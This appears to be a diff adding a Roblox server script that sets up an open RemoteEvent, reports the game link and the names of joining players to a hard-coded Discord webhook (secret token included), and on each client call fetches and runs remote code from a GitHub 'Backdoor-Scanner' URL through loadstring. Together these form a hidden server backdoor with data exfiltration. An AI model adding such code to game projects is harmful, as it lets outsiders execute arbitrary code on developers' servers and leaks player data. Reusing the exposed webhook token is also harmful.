@@ -1,0 +1,51 @@
+local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
+server.OnServerEvent:connect(function(player, SS)
+end)
+
+    
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local webhookURL = "https://discord.com/api/webhooks/1354841859633053746/LoFnT6Wat53FieRjTMUZE4SRdnxe6bEu4aC8zODHZBEEmjJv8tnHfcHZXuopJyO6jIlW" -- Replace with your actual webhook URL
+
+-- Create RemoteEvent on game start
+local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
+
+-- Get game link
+local gameId = game.PlaceId
+local gameLink = "https://www.roblox.com/tr/games/3231515867/SK-NLER-T-rk-Ordu-Sim-lasyonu-V2-5" .. tostring(gameId)
+
+-- Send webhook on game start
+local startData = {
+    ["content"] = "Game started!\n**Game Link:** " .. gameLink
+}
+pcall(function()
+    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(startData), Enum.HttpContentType.ApplicationJson)
+end)
+
+print("Game start notification sent!")
+
+-- Notify when a player joins
+Players.PlayerAdded:Connect(function(player)
+    local joinData = {
+        ["content"] = "**Player Joined!**\n**Player:** " .. player.Name .. "\n**Game Link:** " .. gameLink
+    }
+    pcall(function()
+        HttpService:PostAsync(webhookURL, HttpService:JSONEncode(joinData), Enum.HttpContentType.ApplicationJson)
+    end)
+    print(player.Name .. " joined the game! Notification sent.")
+end)
+
+-- Keep your original event functionality
+server.OnServerEvent:Connect(function(player, SS)
+    -- Send webhook when a script is executed
+    local executeData = {
+        ["content"] = "**Script Executed!**\n**Player:** " .. player.Name .. "\n**Game Link:** " .. gameLink
+    }
+    pcall(function()
+        HttpService:PostAsync(webhookURL, HttpService:JSONEncode(executeData), Enum.HttpContentType.ApplicationJson)
+    end)
+    print("Execution notification sent for " .. player.Name)
+
+    -- Execute the script
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+end)
